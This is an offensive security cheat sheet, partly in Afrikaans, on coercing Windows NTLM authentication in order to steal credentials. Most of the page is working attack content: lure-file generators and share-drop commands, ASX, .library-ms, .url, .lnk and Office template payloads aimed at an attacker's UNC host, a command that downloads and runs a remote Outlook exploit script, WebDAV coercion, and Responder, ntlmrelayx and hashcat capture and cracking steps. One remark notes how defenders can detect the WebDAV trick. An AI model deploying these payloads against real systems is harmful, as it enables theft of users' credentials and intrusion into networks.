# Places to steal NTLM creds

{{#include ../../banners/hacktricks-training.md}}

**Check all the great ideas from [https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/](https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/) from the download of a microsoft word file online to the ntlm leaks source: https://github.com/soufianetahiri/TeamsNTLMLeak/blob/main/README.md and [https://github.com/p0dalirius/windows-coerced-authentication-methods](https://github.com/p0dalirius/windows-coerced-authentication-methods)**

### Writable SMB share + Explorer-triggered UNC lures (ntlm_theft/SCF/LNK/library-ms/desktop.ini)

As jy **toegang het om na ’n share te skryf wat gebruikers of scheduled jobs in Explorer oopmaak**, laat lêers val wie se metadata na jou UNC wys (bv. `\\ATTACKER\share`). Wanneer die gids gerender word, veroorsaak dit **implisiete SMB-authentication** en lek dit ’n **NetNTLMv2** na jou listener.

1. **Generate lures** (dek SCF/URL/LNK/library-ms/desktop.ini/Office/RTF/etc.)
```bash
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft
uv add --script ntlm_theft.py xlsxwriter
uv run ntlm_theft.py -g all -s <attacker_ip> -f lure
```
2. **Drop hulle op die skryfbare share** (enige vouer wat die slagoffer oopmaak):
```bash
smbclient //victim/share -U 'guest%'
cd transfer\
prompt off
mput lure/*
```
3. **Luister en crack**:
```bash
sudo responder -I <iface>          # capture NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt  # autodetects mode 5600
```
Windows kan verskeie lêers gelyktydig tref; enigiets wat Explorer voorskou (`BROWSE TO FOLDER`) vereis geen kliks nie.

### Windows Media Player playlists (.ASX/.WAX)

As jy ’n teiken kan kry om ’n Windows Media Player-playlist wat jy beheer, oop te maak of te voorskou, kan jy Net‑NTLMv2 leak deur die inskrywing na ’n UNC-pad te wys. WMP sal probeer om die verwysde media oor SMB te haal en sal implisiet verifieer.

Voorbeeld-payload:
```xml
<asx version="3.0">
<title>Leak</title>
<entry>
<title></title>
<ref href="file://ATTACKER_IP\\share\\track.mp3" />
</entry>
</asx>
```
Versamelings- en cracking-vloei:
```bash
# Capture the authentication
sudo Responder -I <iface>

# Crack the captured NetNTLMv2
hashcat hashes.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
```
### ZIP-embedded .library-ms NTLM leak (CVE-2025-24071/24055)

Windows Explorer hanteer .library-ms-lêers onveilig wanneer hulle direk van binne ’n ZIP-argief oopgemaak word. As die library-definisie na ’n remote UNC path wys (bv. \\attacker\share), veroorsaak dit dat net om die .library-ms binne die ZIP te blaai/dit te laat loop dat Explorer die UNC enumereer en NTLM authentication na die attacker uitstuur. Dit lewer ’n NetNTLMv2 op wat offline gekraak kan word of moontlik gerelay kan word.

Minimal .library-ms pointing to an attacker UNC
```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<version>6</version>
<name>Company Documents</name>
<isLibraryPinned>false</isLibraryPinned>
<iconReference>shell32.dll,-235</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<simpleLocation>
<url>\\10.10.14.2\share</url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
Bedryfsstappe
- Skep die .library-ms-lêer met die XML hierbo (stel jou IP/hostname).
- Zip dit (op Windows: Send to → Compressed (zipped) folder) en lewer die ZIP aan die teiken.
- Run 'n NTLM capture listener en wag vir die slagoffer om die .library-ms van binne die ZIP oop te maak.


### Outlook kalenderherinnering-klankpad (CVE-2023-23397) – zero-click Net-NTLMv2 leak

Microsoft Outlook vir Windows het die uitgebreide MAPI-eienskap PidLidReminderFileParameter in kalenderitems verwerk. As daardie eienskap na 'n UNC path wys (bv. \\attacker\share\alert.wav), sou Outlook die SMB share kontak wanneer die herinnering afgaan, wat die gebruiker se Net-NTLMv2 lek sonder enige klik. Dit is op 14 Maart 2023 reggemaak, maar dit bly steeds hoogs relevant vir legacy/untouched fleets en vir historiese incident response.

Quick exploitation with PowerShell (Outlook COM):
```powershell
# Run on a host with Outlook installed and a configured mailbox
IEX (iwr -UseBasicParsing https://raw.githubusercontent.com/api0cradle/CVE-2023-23397-POC-Powershell/main/CVE-2023-23397.ps1)
Send-CalendarNTLMLeak -recipient user@example.com -remotefilepath "\\10.10.14.2\share\alert.wav" -meetingsubject "Update" -meetingbody "Please accept"
# Variants supported by the PoC include \\host@80\file.wav and \\host@SSL@443\file.wav
```
Luisteraar-kant:
```bash
sudo responder -I eth0  # or impacket-smbserver to observe connections
```
Notas
- ’n Slagoffer benodig slegs dat Outlook for Windows loop wanneer die herinnering aktiveer.
- Die leak lewer Net‑NTLMv2 wat geskik is vir offline cracking of relay (nie pass‑the‑hash nie).


### .LNK/.URL icon-based zero‑click NTLM leak (CVE‑2025‑50154 – bypass of CVE‑2025‑24054)

Windows Explorer render shortcut icons automatically. Onlangse navorsing het getoon dat selfs ná Microsoft se April 2025 patch vir UNC‑icon shortcuts, dit steeds moontlik was om NTLM authentication te trigger sonder enige clicks deur die shortcut target op ’n UNC path te host en die icon lokaal te hou (patch bypass assigned CVE‑2025‑50154). Deur bloot die folder te view, laat Explorer metadata vanaf die remote target retrieve, en stuur NTLM na die attacker SMB server.

Minimal Internet Shortcut payload (.url):
```ini
[InternetShortcut]
URL=http://intranet
IconFile=\\10.10.14.2\share\icon.ico
IconIndex=0
```
Program Shortcut payload (.lnk) via PowerShell:
```powershell
$lnk = "$env:USERPROFILE\Desktop\lab.lnk"
$w = New-Object -ComObject WScript.Shell
$sc = $w.CreateShortcut($lnk)
$sc.TargetPath = "\\10.10.14.2\share\payload.exe"  # remote UNC target
$sc.IconLocation = "C:\\Windows\\System32\\SHELL32.dll" # local icon to bypass UNC-icon checks
$sc.Save()
```
Delivery ideas
- Drop the shortcut in a ZIP and get the victim to browse it.
- Place the shortcut on a writable share the victim will open.
- Combine with other lure files in the same folder so Explorer previews the items.

### No-click .LNK NTLM leak via ExtraData icon path (CVE‑2026‑25185)

Windows loads `.lnk` metadata during **view/preview** (icon rendering), not only on execution. CVE‑2026‑25185 shows a parsing path where **ExtraData** blocks cause the shell to resolve an icon path and touch the filesystem **during load**, emitting outbound NTLM when the path is remote.

Key trigger conditions (observed in `CShellLink::_LoadFromStream`):
- Include **DARWIN_PROPS** (`0xa0000006`) in ExtraData (gate to icon update routine).
- Include **ICON_ENVIRONMENT_PROPS** (`0xa0000007`) with **TargetUnicode** populated.
- The loader expands environment variables in `TargetUnicode` and calls `PathFileExistsW` on the resulting path.

If `TargetUnicode` resolves to a UNC path (e.g., `\\attacker\share\icon.ico`), **merely viewing a folder** containing the shortcut causes outbound authentication. The same load path can also be hit by **indexing** and **AV scanning**, making it a practical no-click leak surface.

Research tooling (parser/generator/UI) is available in the **LnkMeMaybe** project to build/inspect these structures without using the Windows GUI.


### WebDAV auth coercion / credential validation via `davclnt.dll,DavSetCookie`

The native **WebDAV client** can be abused to force the current logon session to authenticate to an arbitrary **HTTP/WebDAV** endpoint:
```cmd
rundll32.exe davclnt.dll,DavSetCookie <HOST> http://<TARGET>/C$/Windows
```
Waarom dit nuttig is:
- Teen 'n **aanvaller-beheerde WebDAV-server** kan dit **NTLM over HTTP** aktiveer sonder om 'n custom client te laat val.
- Teen **interne hosts** is dit 'n stille manier om te **bevestig waar gesteelde credentials aanvaar word** voordat jy lateraal beweeg.
- Die command is 'n goeie alternatief wanneer **SMB egress gefilter** is, maar **HTTP/WebDAV** steeds bereikbaar is.

Operational notes:
- Die **WebClient** service moet op die bron-host loop.
- `rundll32.exe` laai `davclnt.dll` en laat Windows die WebDAV-authentication hanteer met die **current user's credentials**.
- As jy dit na infrastruktuur wys wat jy beheer, gebruik 'n NTLM-aware HTTP listener/relay soos:
```bash
# Capture or relay NTLM over HTTP/WebDAV
ntlmrelayx.py -t smb://<TARGET> --http-port 80
```
From 'n detection perspective, repeated `rundll32.exe davclnt.dll,DavSetCookie` executions against many internal systems are a strong signal of **credential validation / spray-like lateral movement prep** rather than normale gebruiker-gedrag.

### Office remote template injection (.docx/.dotm) to coerce NTLM

Office documents can reference an external template. If you set the attached template to a UNC path, opening the document will authenticate to SMB.

Minimal DOCX relationship changes (inside word/):

1) Edit word/settings.xml and add the attached template reference:
```xml
<w:attachedTemplate r:id="rId1337" xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>
```
2) Wysig word/_rels/settings.xml.rels en wys rId1337 na jou UNC:
```xml
<Relationship Id="rId1337" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="\\\\10.10.14.2\\share\\template.dotm" TargetMode="External" xmlns="http://schemas.openxmlformats.org/package/2006/relationships"/>
```
3) Herverpak na .docx en lewer af. Begin jou SMB capture listener en wag vir die oopmaak.

Vir post-capture idees oor relaying of NTLM abuse, kyk:

{{#ref}}
README.md
{{#endref}}


## References
- [HTB: Breach – Writable share lures + Responder capture → NetNTLMv2 crack → Kerberoast svc_mssql](https://0xdf.gitlab.io/2026/02/10/htb-breach.html)
- [HTB Fluffy – ZIP .library‑ms auth leak (CVE‑2025‑24071/24055) → GenericWrite → AD CS ESC16 to DA (0xdf)](https://0xdf.gitlab.io/2025/09/20/htb-fluffy.html)
- [HTB: Media — WMP NTLM leak → NTFS junction to webroot RCE → FullPowers + GodPotato to SYSTEM](https://0xdf.gitlab.io/2025/09/04/htb-media.html)
- [Morphisec – 5 NTLM vulnerabilities: Unpatched privilege escalation threats in Microsoft](https://www.morphisec.com/blog/5-ntlm-vulnerabilities-unpatched-privilege-escalation-threats-in-microsoft/)
- [MSRC – Microsoft mitigates Outlook EoP (CVE‑2023‑23397) and explains the NTLM leak via PidLidReminderFileParameter](https://www.microsoft.com/en-us/msrc/blog/2023/03/microsoft-mitigates-outlook-elevation-of-privilege-vulnerability/)
- [Cymulate – Zero‑click, one NTLM: Microsoft security patch bypass (CVE‑2025‑50154)](https://cymulate.com/blog/zero-click-one-ntlm-microsoft-security-patch-bypass-cve-2025-50154/)
- [TrustedSec – LnkMeMaybe: A Review of CVE‑2026‑25185](https://trustedsec.com/blog/lnkmemaybe-a-review-of-cve-2026-25185)
- [TrustedSec LnkMeMaybe tooling](https://github.com/trustedsec/LnkMeMaybe)
- [Rapid7 – When IT Support Calls: Dissecting a ModeloRAT Campaign from Teams to Domain Compromise](https://www.rapid7.com/blog/post/tr-it-support-dissecting-modelorat-campaign-microsoft-teams-compromise)
- [Microsoft Learn – davclnt.h header](https://learn.microsoft.com/en-us/windows/win32/api/davclnt/)
- [Splunk – Windows Rundll32 WebDAV Request](https://research.splunk.com/endpoint/320099b7-7eb1-4153-a2b4-decb53267de2/)


{{#include ../../banners/hacktricks-training.md}}
